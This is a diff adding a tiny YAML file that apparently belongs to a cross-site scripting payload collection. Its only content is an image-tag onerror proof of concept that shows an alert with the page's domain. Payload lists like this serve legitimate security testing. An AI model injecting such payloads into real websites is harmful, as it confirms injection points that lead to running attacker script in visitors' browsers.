@@ -1,0 +1,8 @@
+metadata:
+  filename: "xss-img-onerror-poc-alert.yaml"
+  tags: ["web", "xss"]
+  created: "2025-03-29"
+  author: "Unknown"
+
+content: |
+  <img src=x onerror=alert(document.domain)>
